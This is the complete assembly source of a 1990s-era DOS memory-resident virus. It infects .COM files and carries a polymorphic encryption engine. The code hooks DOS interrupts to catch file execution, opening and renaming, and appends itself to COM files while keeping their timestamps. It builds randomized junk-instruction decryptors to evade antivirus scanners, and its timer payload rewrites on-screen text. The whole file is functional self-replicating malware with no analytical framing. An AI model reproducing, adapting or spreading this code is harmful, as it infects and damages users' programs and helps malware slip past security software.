   ; TSR com infector á ¯®«¨¬®àä¨ª £¥¥à â®à®¬ [IDA] v_0.01.
   ;                             Wait for next versions !!!
   ;
   ;Copyright by Serg_Enigma
   ;
       .MODEL tiny
       .386p            ;             ÚÄÄÄÄÄÄÄÄ¿
       .code            ;             ³ AdInf  ³
       org 100h         ;             ³  MUST  ³
   start:                   ;             ³   DIE  ³
       jmp     sc       ;             ÀÄÄÄÄÄÄÄÄÙ
       db      200d dup(08h)
   sc      PROC
       Call    Get_offset
   Get_offset:     Pop     Bp
       Sub     Bp,offset Get_offset
       Mov Dx,0000h
       Lea Si,offset dat+[Bp]
       Mov Cx,lng_II-2
   Dream:  Xor word ptr [Si],Dx
       Add Dx,'SE'
       Inc Si
       Loop    dream


   Dat:    Mov     Ax,0deadh
       Int     21h
       Cmp     Di,1996h
       Je      Rt
       Mov     Bx,Es
       Dec     Bx
       Mov     Es,Bx
       Mov     byte ptr Es:00,'Z'
       Mov     Ax,word ptr Cs:[02]
       Sub     Ax,mem
       Mov     word ptr Cs:[02],Ax
       Mov     Ax,word ptr es:[03]
       Sub     Ax,mem
       Mov     word ptr es:[03],Ax
       Stc
       Adc     Ax,Bx
       Mov     Es,Ax
       Push    Es
       Mov     Ax,3521h
       Int     21h
       Mov     word ptr Cs:s1 +[Bp],Bx
       Mov     word ptr Cs:s2 +[Bp],Es
       Pop     Es
       Push    Cs
       Pop     Ds
       Lea     Si,Sc+[Bp]
       Xor     Di,Di
       Mov     Cx,Lng
       Cld
       Rep     MovSb
       Mov     Dx,offset res-103h-200d
       Push    Es
       Pop     Ds
       Mov     Ax,2521h
       Int     21h
       Mov     Ax,351Ch
       Int     21h
       Mov     word ptr Ds:hm-100h-203d,Bx
       Mov     word ptr Ds:lm-100h-203d,Es
       Mov     Dx,offset int_1c - 103h - 200d
       Mov     Ah,25h
       Int     21h
   rt:
       Push    Cs
       Pop     Ds
       Push    Cs
       Pop     Es
       Lea     Si,Buf_j+[Bp]
       Mov     Di,100h
   ;       Push    Di
       MovSw
       MovSb
       Xor     Ax,Ax
       Xor     Cx,Cx
       Cwd
       Mov     Bx,Dx
       Push    100h
       Ret

   Res:    Pushf
       Push    Ax
       Push    Bx
       Push    Cx
       Push    Dx
       Push    Ds
       Push    Es
       Push    Si
       Push    Di
       Cmp     Ax,4b00h ;run
       Jz      Get_name
       Cmp     Ah,56h   ;rename
       Jz      Get_name
       Cmp     Ah,3dh   ;open
       Jz      Get_name
       Cmp     Ah,43h   ;atribut
       Jz      Get_name
       Jmp     Exit

   Get_name:
       Clc
       Mov     Cx,128
       Xor     Al,Al
       Mov     Di,Dx
   z1:     Cmp     Al,Ds:[Di]
       Je      lng_ext
       Inc     Di
       Loop    z1
       Jmp     Exit
   lng_ext:
       Sub     Di,4
       Mov     Al,'.'
       Cmp     Al,Ds:[Di]
       je      Test_ext
       Jmp     Exit
   Test_ext:
       Mov     Si,Di
       Sub     Si,6
       Mov     Ax,Ds:[Si]
       And     Ax,0dfdfh
       Cmp     Ax,'BI'
       Je      Ex
       Inc     Di
       Mov     Al,Ds:[Di]
       And     Al,0dfh
       Cmp     Al,'C'
       Jne     Ex
       Inc     Di
       Mov     Al,Ds:[Di]
       And     Al,0dfh
       Cmp     Al,'O'
       Jne     Ex
       Inc     Di
       Mov     Al,Ds:[Di]
       And     Al,0dfh
       Cmp     Al,'M'
       Je      Infect
   Ex:     Jmp     Exit

   infect:
       Call    set_24
       Mov     Ax,4300h
       Call    Intr21
       Xor     Ch,Ch
       And     Cx,0fffeh
       Mov     Ax,4301h
       Call    Intr21
       Mov     Ax,3d02h
       Call    Intr21
       Jc      late
       Xchg    Ax,Bx
       Mov     Ax,4200h
       Call    move
       Push    Cs
       Pop     Ds
       Mov     Ah,3fh
       Mov     Cx,3h
       Mov     Dx,offset Buf_j - 100h - 203d
       Call    Intr21
       Cmp     word ptr buf_j-100h-203d,'ZM'
       Jz      Close
       Mov     Ax,5700h
       Call    Intr21
       Mov     word ptr time-100h-203d,Cx
       Mov     word ptr date-100h-203d,Dx
       Mov     Ax,4202h
       Mov     Dx,-02h
       Mov     Cx,0ffffh
       Call    Intr21
       Mov     Ah,3fh
       Mov     Cx,02h
       Mov     Dx,offset buffer-100h-203d
       Call    Intr21
       Mov     Si,Dx
       Mov     Dx,word ptr ID-100h-203d
       Cmp     word ptr [Si],Dx
       Je      Close
       Mov     Ax,4200h
       Call    move
       Mov     Ax,4202h
       Call    move
       Cmp     Ax,62000d
       ja      close
       Cmp     Ax,100h
       jb      close
       Mov     word ptr _size-100h-203d,Ax
       Sub     Ax,03h
       Mov     word ptr New_j-100h-202d,Ax


   ;################################## [IDA] v_0.01 ##############################
       Push    Bx
       Call    Poly
       Pop     Bx              ;                 #############################
       Cmp Ax,0ffffh
       je  Close

       Mov     Ah,40h          ;                 #
       Xor     Dx,Dx           ;                 #
       Mov     Cx,D_last - 100h-203 ;            #
       Push    Es              ;                 #
       Pop     Ds              ;                 #
       Call    Intr21          ;                 #
   ;#########################################        #
       Mov     Ah,40h          ;        #        #
       Mov     Dx,100h         ;        #        #
       Mov     Cx,lng          ;        #        #
       Call    Intr21          ;        #        #
   ;#########################################        #
       Mov     Ah,49h  ;                         #
       Call    intr21  ;                         #
       Push    Cs      ;                         #
       Pop     Ds      ;                         #
   ;##################################################

       Mov     Ax,4200h
       Call    move
       Mov     Ah,40h
       Mov     Dx,offset New_j-100h-203d
       Mov     Cx,3h
       Call    Intr21
       Mov     Ax,5701h
       Mov     Dx,word ptr cs:date-100h-203d
       Mov     Cx,word ptr cs:time-100h-203d
       Call    Intr21
   Close:
       Mov     Ah,3eh
       Call    Intr21
   Late:   Push    Cs
       Pop     Ds
       Mov     Dx,word ptr Old_24 - 100h - 203d
       Push    word ptr Old_24a - 100h - 203d
       Pop     Ds
       Mov     Ax,2524h
       Call    Intr21
   Exit:   Pop     Di
       Pop     Si
       Pop     Es
       Pop     Ds
       Pop     Dx
       Pop     Cx
       Pop     Bx
       Pop     Ax
       Cmp     Ax,0deadh
       Je      Ok
       Popf

   Old_21:
       Jmp     dword ptr Cs:s1-100h-203d
   ;==============================================================
   set_24: Push    Ds
       Push    Dx
       Push    Bx
       Push    Es
       Mov     Ax,3524h
       Call    Intr21
       Push    Cs
       Pop     Ds
       Mov     word ptr old_24 - 100h - 203d,Bx
       Mov     word ptr old_24a - 100h - 203d,Es
       Mov     Ah,25h
       Mov     Dx,offset New_24 - 100h - 203d
       Call    Intr21
       Pop     Es
       Pop     Bx
       Pop     Dx
       Pop     Ds
       Ret

   New_24: Mov     Al,3
       Iret

   ok:     Mov     Di,1996h
       Popf
       Iret

   Buf_j   db      0cdh,20h,90h
   New_j   db      0e9h,00h,00h

   date    dw      ?
   time    dw      ?

   move:   Xor     Cx,Cx
       Cwd
       Call    Intr21
       ret
   intr21:
       Pushf
       db      09ah
   s1      dw      ?
   s2      dw      ?
       Ret

   int_1c: push    ds
       push    es
       push    ax
       push    dx
       push    cx
       push    di
       push    si
       cmp     byte ptr cs:data_3e,0
       jae     loc_1
       jmp     short loc_8

   Mes     db      'IVeronika !'
   mes_lng =       $-offset Mes
   data_2e db      'VERA'
   data_3e db      14h

   loc_1:  mov     byte ptr cs:data_3e-100h-203d,14h
       mov     ax,0B800h
       mov     es,ax
       mov     di,0fa0h
   loc_2:  sub     di,8
       clc
   loc_3:  mov     al,es:[di]
       and     al,0DFh
       cmp     al,56h  ; 'V'
       je      loc_5
   loc_4:  dec     di
       dec     di
       cmp     di,1388h
       jb      loc_3
       jmp     short loc_9
   loc_5:  mov     cx,4
       mov     si,offset data_2e - 100h - 203d
       push    cs
       pop     ds
       cld
   loop_6: mov     al,es:[di]
       and     al,0DFh
       cmp     [si],al
       jne     loc_2
       inc     di
       inc     di
       inc     si
       loop    loop_6
       mov     cx,mes_lng
       sub     di,8
       mov     si,offset Mes - 100h - 203d
   loop_7: movsb
       inc     di
       loop    loop_7
   loc_8:  dec     byte ptr cs:data_3e -100h-203d
   loc_9:  pop     si
       pop     di
       pop     cx
       pop     dx
       pop     ax
       pop     es
       pop     ds
   Old_1c:
       db      0eah
   hm      dw      ?
   lm      dw      ?

   _size   dw      ?

   Old_24  dw      ?
   Old_24a dw      ?

   ;########################## [IDA]'s Subprograms ###############################
   Poly:           Mov     Ah,48h                  ;
           Mov     Bx,mem+80h                    ;
           Call    intr21                    ;
           jnc You
           Mov Ax,0ffffh
           Ret
   You:        Mov     Es,Ax                     ;
           Mov     word ptr new_seg-100h-203d,Ax ;
           Mov     word ptr D_lng-100h-203d,0    ;
           Mov     word ptr D0lng-100h-203d,0    ;
   Big:            Call    Get_rnd                 ;
           Mov     Ax,000fh                ;
           Call    Get_off                 ;
           Or      Di,Di                   ;
           Jz      Big                     ;
           Mov     Cx,Di                   ;
           Xor     Di,Di                   ;
   Gen_com:        Push    Di                      ;
           Call    Get_rnd                 ;
           Mov     Ax,0025                 ;
           Call    Get_off                 ;
           Lea     Si,[Di]+one_b_op-100h-203d    ;
           Pop     Di                      ;
           Cld
           LodSb                           ;
           StoSb                           ;
           Loop    Gen_com                 ;
           Mov     word ptr D_lng-100h-203d,Di  ;########################## 1
           Call    Get_rnd                 ;
           Mov     Ax,17                   ;
           Call    Get_off                 ;
           Mov     Ax,7h                   ;
           Mul     Di                      ;
           Push    Es                      ;
           Push    Cs                      ;
           Pop     Es
           Mov     Si,offset log_op - 100h-203d
           Add     Si,Ax
           Mov     word ptr cm_off-100h-203d,Si
           Mov     Di,offset com_buf - 100h-203d
           Cld
           MovSw
           Pop     Es
           Call    Set_op                  ;creating table
           Cmp     byte ptr m2-100h-203d,0
           Je      one_com
           Mov     Di,word ptr D_lng-100h-203d
           Mov     Si,offset m2-100h-203d
           LodSb
           StoSb
           Inc     Di
           Inc     Di
           Call    Gen_Gar
           Add     word ptr D0lng-100h-203d,3
   one_com:        Mov     Di,word ptr D_lng-100h-203d
           Add     Di,word ptr D0lng-100h-203d
           Mov     word ptr D_lng1-100h-203d,Di ;######################## 2
           Mov     Si,offset m1-100h-203d
           Cld
           LodSb
           StoSb
           Inc     Di
           Inc     Di
           Call    Gen_Gar
           Mov     Si,offset com_buf-100h-203d
           Cld
           LodSw
           StoSw
           Call    Gen_Gar
           Mov     Si,word ptr cm_off-100h-203d
           Add     Si,5
           Cld
           LodSb
           StoSb
           Call    Gen_Gar
           Mov     word ptr D_lng2-100h-203d,Di ;###################### 3
           Mov     Si,offset _cmp-100h-203d
           Cld
           LodSw
           StoSw
           Inc     Di
           Inc     Di
           Call    Gen_Gar
           Mov     Si,offset Jx1-100h-203d
           Mov     word ptr D_lng4-100h-203d,Di ;###### Jb / Loop ###### 4
           Cld
           LodSw
           StoSw
           Call    Gen_Gar
           Mov     word ptr D_last-100h-203d,Di

           Mov     Di,word ptr D_lng-100h-203d
           Inc     Di
           Call    Get_rnd
           clc
           Mov     word ptr es:[Di],Bx
           Mov     Di,word ptr D_lng1-100h-203d
           Inc     Di
           Mov     word ptr es:[Di],100h

           Mov     Di,word ptr D_lng2-100h-203d ; cmp xx,offset end
           Inc     Di
           Inc     Di
           Mov     word ptr es:[Di],lng+0fdh ; not crypt last 3 byte of ID

           Mov     Di,word ptr D_lng4-100h-203d
           Inc     Di
           Mov     Ax,word ptr D_lng4-100h-203d
           Sub     Ax,word ptr D_lng1-100h-203d
           Mov     Bl,01h
           Sub     Bl,Al
           Mov     byte ptr es:[Di],Bl
           Mov     Cx,lng
           Mov     Si,offset Sc-100h-203d
           Mov     Di,100h
           Rep     MovSb

           Mov Di,offset dat-203d
           Mov Cx,lng_II-2
           Call    Get_rnd
           Mov word ptr Es:[109h],Bx ;###############   ##############
   Drug:       Xor word ptr Es:[Di],Bx
           Add Bx,'SE'
           Inc Di
           Loop    Drug

           Mov     Di,D_last-100h-203d
           Mov     byte ptr Es:[Di],0cbh
           Push    Ds
           Push    Es
           Pop     Ds

           Pushf
           Push    Bp
           db      09ah
           dw      0
   new_seg         dw      ?
           Pop Bp
           Popf

           Pop     Ds
           Mov     Dx,word ptr _size-100h-203d
           Add     Dx,word ptr D_last-100h-203d
           Mov     Di,word ptr D_lng1-100h-203d
           Inc     Di
           Add     Dx,100h
           Mov     word ptr es:[Di],Dx
           Add     Dx,Lng
           Mov     Di,word ptr D_lng2-100h-203d
           Inc     Di
           Inc     Di
           Sub     Dx,3
           Mov     word ptr es:[Di],Dx
           Ret

   one_b_op        db      040h                    ; Inc Ax
           db      041h                    ; Inc Cx
           db      042h                    ; inc dx
           db      043h                    ; inc bx*
           db      045h                    ; inc bp
           db      046h                    ; inc si*
           db      047h                    ; inc di*
           db      048h                    ; dec ax
           db      049h                    ; dec cx
           db      04ah                    ; dec dx
           db      04bh                    ; dec bx*
           db      04dh                    ; dec bp
           db      04eh                    ; dec si*
           db      04fh                    ; dec di*
           nop
           nop
           cld
           cbw
           cld
           nop
           db      090h                    ; Nop
           db      026h                    ;
           db      03Eh                    ;
           db      042h                    ;
           db      02Eh                    ;

   log_op  db      0F6h, 14h  ,0feh,0beh,000h,046h,04eh ;0        Not b,[Si]
       db      0F6h, 15h  ,0ffh,0bfh,000h,047h,04fh ;1        Not b,[Di]
       db      0F6h, 17h  ,0fbh,0bbh,000h,043h,04bh ;2        Not b,[Bx]
       db      0F6h, 1Ch  ,0feh,0beh,000h,046h,04eh ;3        Neg b,[Si]
       db      0F6h, 1Dh  ,0ffh,0bfh,000h,047h,04fh ;4        Neg b,[Di]
       db      0F6h, 1Fh  ,0fbh,0bbh,000h,043h,04bh ;5        Neg b,[Bx]

       db      031h, 04h  ,0feh,0beh,0b8h,046h,04eh ;6        Xor w,[Si],Ax
       db      031h, 05h  ,0ffh,0bfh,0b8h,047h,04fh ;7        Xor w,[Di],Ax
       db      031h, 07h  ,0fbh,0bbh,0b8h,043h,04bh ;8        Xor w,[Bx],Ax
       db      031h, 0Ch  ,0feh,0beh,0b9h,046h,04eh ;9        Xor w,[Si],Cx
       db      031h, 0Dh  ,0ffh,0bfh,0b9h,047h,04fh ;10       Xor w,[Di],Cx
       db      031h, 0Fh  ,0fbh,0bbh,0b9h,043h,04bh ;11       Xor w,[Bx],Cx
       db      031h, 14h  ,0feh,0beh,0bah,046h,04eh ;12       Xor w,[Si],Dx
       db      031h, 15h  ,0ffh,0bfh,0bah,047h,04fh ;13       Xor w,[Di],Dx
       db      031h, 17h  ,0fbh,0bbh,0bah,043h,04bh ;14       Xor w,[Bx],Dx
       db      031h, 1Ch  ,0feh,0beh,0bbh,046h,04eh ;15       Xor w,[Si],Bx
       db      031h, 1Dh  ,0ffh,0bfh,0bbh,047h,04fh ;16       Xor w,[Di],Bx
   Jx1     db      072h, 00h               ; Jb yy
   ;Jx2     db      0e2h, 00h               ; Loop yy

   copyright       db      0,'[IDA] v0.01',0,'Serg_Enigma',0
   ;message                db      'ˆ íâ® ¥éñ ¥ ¢áñ... 1997£'
   D0lng           dw      0       ;
   D_lng           dw      0       ; ‘¬¥é¥¨¥   Mov ??,???? = 1
   D_lng1          dw      0       ; ‘¬¥é¥¨¥   Mov ??,???? = 2
   D_lng2          dw      0       ; ‘¬¥é¥¨¥   Cmp ??,????
   D_last          dw      0       ; ‘¬¥é¥¨¥   ¯®á«¥¤¨© ¡ ©â CRYPT' 
   D_lng4          dw      ?       ; OFFSET Jb yy
   Count           db      ?
   _Cmp            db      081h
   _c              db      0
   m1              db      0
   m2              db      0
   ni1             db      0
   ni2             db      0
   ;ni3            db      0
   ;ni4            db      0
   Com_buf         dw      ?
   Data            dw      ?
   Cm_off          dw      ?

   Set_op:         Push    Es
           Push    Cs
           Pop     Es
           Push    Di
           Push    Si
           Mov     Si,word ptr cm_off-100h-203d
           Inc     Si
           Inc     Si
           Mov     Di,offset _c-100h-203d
           mov cx,5
           rep movsb
           Pop     Si
           Pop     Di
           Pop     Es
           Ret

   Gen_gar:        Xchg    Di,Dx
   gar:            Call    Get_rnd         ;
           Mov     Ax,000fh
           Call    Get_off
           Or      Di,Di
           Jz      gar
           Mov     Cx,Di
           Mov     word ptr D0lng-100h-203d,Cx  ; „«¨  2
   ag2:            Call    Get_rnd
           Mov     Ax,0025
           Call    Get_off
           Lea     Si,[Di]+one_b_op-100h-203d
           LodSb
           Cmp     Al,byte ptr ni1-100h-203d
           Je      ag2
           Cmp     Al,byte ptr ni2-100h-203d
           Je      ag2
           Mov     Di,Dx
           Cld
           StoSb
           Mov     Dx,Di
           Loop    ag2     ;Gen_com1
           Ret

   Get_off:
           Push    Ax                      ; di - result
           Push    Bx
           Push    Cx
           Push    Dx
           Xchg    Dx,Bx
           Xor     Bx,Bx
           Mov     Cx,65535
   der:            Mov     Bh,Ah  ;start of space
   cyc:            call    ser
           Inc     Bh
           Cmp     Bh,Al  ;end of space
           Jnz     cyc
           Loop    der
           ret

   _ok:            Xor     Bl,Bl
           Xchg    Bh,Bl
           Mov     Di,Bx
           Pop Dx
           Pop Cx
           Pop Bx
           Pop Ax
           Cld
           Ret
   ser:            Inc Bl
           Cmp Bl,Dl
           Jz fc
           Ret
   fc:             Pop Cx
           Jmp _ok

   Get_rnd:        Push    Ax              ; bx - random number
           Push    Dx
           Push    Es
           Push    Di
           Push    Cx
           In      Ax,[40h]
           Xchg    Ax,Dx
           Inc     byte ptr Count-100h-203d
           Mov     Ax,0f800h
           Mov     Es,Ax
           Mov     Di,word ptr Data-100h-203d
           Xor     Dx,word ptr Es:[Di]
           Mov     word ptr Data+100h-203d,Dx
           Mov     Cl,byte ptr Count+100h-203d
           Rol     Dx,Cl
           Mov     Bx,Dx
           Pop     Cx
           Pop     Di
           Pop     Es
           Pop     Dx
           Pop     Ax
           Cld
           Ret

   ;##############################################################################

   Buffer  dw      ?
   Lng_II  =   $-dat
   sc      ENDP
   ID      db      ''
   Lng     =       $-Sc
   mem     =       (Lng/16d)+10
   END start
   END

   ; IDDQD
